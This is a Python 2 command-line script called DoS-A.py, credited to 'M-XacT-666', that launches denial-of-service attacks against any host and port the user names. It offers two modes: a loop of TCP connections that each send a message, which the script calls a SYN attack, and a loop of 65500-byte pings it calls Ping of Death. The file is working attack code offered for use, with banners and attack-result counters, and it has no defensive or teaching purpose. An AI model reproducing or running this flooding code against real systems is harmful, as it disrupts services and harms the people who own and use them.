#!/usr/bin/python2
#!/usr/env python2

# Copyright by M-XacT-666
''' Script Kiddie, learn this script and modify with Your own style.
    Do not Paste and Copy it.
    Changing the Variabel and the Author Name didn't make You be a Programmer '''
# Note: ASCII Art is copyrighted to Steven Paul Adams
#       visit: https://www.asciiart.eu/weapons/guns

import socket,argparse,platform,os
if platform.system() == 'Windows':
	os.system('cls')
else:
	os.system('clear')
def jeda():
	raw_input("Press [ENTER] ")

parser = argparse.ArgumentParser()
parser.add_argument("--target",dest='target',help="Target HOST/IP",type=str)
parser.add_argument("--port",dest='port',help="Port to Attack",type=int,default=80)
parser.add_argument("--total",dest='total',help="Total Attack",type=int,default=10000)
parser.add_argument("--mode",dest='mode',help="Attack Mode (check EXAMPLE.txt)",type=str,default='syn')
parser.add_argument("--message",dest='message',help="Message to send (syn only)",type=str,default='Attacked with DoS-A !!!')
options = parser.parse_args()

if options.target == '' or options.target == 'None' or options.target == None:
	print ""
	print "[!] Error: Target unidentificated! Please check again"
	print "           Your command! learn on 'EXAMPLE.txt'"
	print "           or You can try run 'DoS-A.py --help' command"
	print ""
	jeda()
	exit()

try:
	print ""
	ip_address = socket.gethostbyname(options.target)
except:
	print "[!] Error: Can't find IP Address from {0}".format(options.target)
	print "           check Your connection or check the Host Address!"
	print ""
	jeda()
	exit()

print '''
   DoS-A.py ---> DoS Attack Tool writed in Python2
   Coded by M-XacT-66

 +--^----------,--------,-----,--------^-,
 | |||||||||   `--------'     |          O
 `+---------------------------^----------|
   `\_,---------,---------,--------------'
     / XXXXXX /'|       /'   Target        : {0}
    / XXXXXX /  `\    /'     IP Address    : {1}
   / XXXXXX /`-------'       Attacked Port : {2}
  / XXXXXX /                 Total Attack  : {3}
 / XXXXXX /                  Attack Mode   : {4}
(________(                   Message       : {5}
 `------'
'''.format(options.target,ip_address,options.port,options.total,options.mode,options.message)
'''
print "[+] INFORMATION ABOUT ATTACK"
print " |---> Target  : %s" % options.target
print " |---> IP Address   : %s" % ip_address
print " |---> Port    : %s" % options.port
print " |---> Total Attack : %s" % options.total
print " |---> Mode    : %s" % options.mode
print " |---> Message : %s" % options.message
print "[+] END OF INFORMATION ABOUT ATTACK"
'''
print ""
confirm = raw_input("Confirmation (Y/n) > ")
if confirm == "n" or confirm == "N" or confirm == "no" or confirm == "NO" or confirm == "No":
	print ""
	print "[-] Attack Canceled with Confirmation..."
	print ""
	exit()
else:
	pass

if options.mode == "syn" or options.mode == "SYN" or options.mode == "Syn":
	berhasil = 0
	gagal = 0
	pedang = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	pedang.settimeout(1)
	try:
		print "[*] Checking if Port is Open..."
		robek = pedang.connect_ex((ip_address,options.port))
		if robek == 0:
			print " |---> Port %s is Open!" % options.port
			print ""
			pass
		else:
			print " |---> Port %s is Closed :(" % options.port
			print ""
			jeda()
			exit()
	except:
		print "[-] Unknown Error has been occured!"
		exit()
	print "[+] Syn Attack (TCP-Attack) is Launched to {0} with {1} Total Attack".format(ip_address,options.total)
	for i in range(1,(options.total + 1)):
		try:
			pisau = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			pisau.settimeout(0.5)
			pisau.connect_ex((ip_address,options.port))
			pisau.send(options.message)
			pisau.sendto(options.message,(ip_address,options.port))
			pisau.send(options.message)
			print "[*]---[TCP]---[ {0} Request Successfully sended to {1} ]".format(i,ip_address)
			berhasil += 1
		except KeyboardInterrupt:
			print ""
			print "[-] Attack Canceled with Keyboard Interrupt by User..."
			print ""
			jeda()
			break
		except:
			print "[*]---[TCP]---[ Error when sending Request to {0} ]".format(ip_address)
			gagal += 1
			pass
	print ""
	print "[+] ATTACK RESULT"
	print " |---> Success : {0} from {1}".format(berhasil,options.total)
	print " |---> Failure : {0}".format(gagal)
	print ""
	jeda()
	exit()

elif options.mode == "pod" or options.mode == "POD" or options.mode == "Pod" or options.mode == "PoD":
	berhasil = 0
	gagal = 0
	if platform.system() == 'Windows' or platform.system() == 'windows' or platform.system() == "WINDOWS":
		client_os = 'Windows'
		perintah = 'ping -l 65500 -w 1 -n 1 {} > nul'.format(ip_address)
	else:
		client_os = 'Linux/Unix'
		perintah = 'ping -s 65500 -W 1 -c 1 {} > nul'.format(ip_address)
	print "[+] POD Attack (Ping Of Death) is Launched to {0} with {1} Total Attack".format(ip_address,options.total)
	for i in range(1,(options.total + 1)):
		try:
			os.system(perintah)
			print "[*]---[POD]---[ {0} Request Successfully sended to {1} ]".format(i,ip_address)
			berhasil += 1
		except KeyboardInterrupt:
			print ""
			print "[-] Attack Canceled with Keyboard Interrupt by User..."
			print ""
			jeda()
			break
		except:
			print "[*]---[POD]---[ Error when sending Request to {0} ]".format(ip_address)
			gagal += 1
			pass
	print ""
	print "[+] ATTACK RESULT"
	print " |---> Success : {0} from {1}".format(berhasil,options.total)
	print " |---> Failure : {0}".format(gagal)
	print ""
	jeda()
	exit()

# Copyright by M-XacT-666
# Script Kiddie, learn this script and modify with Your own style
# Do not Paste and Copy it
# Changing the Variabel and the Author Name didn't make You be a Programmer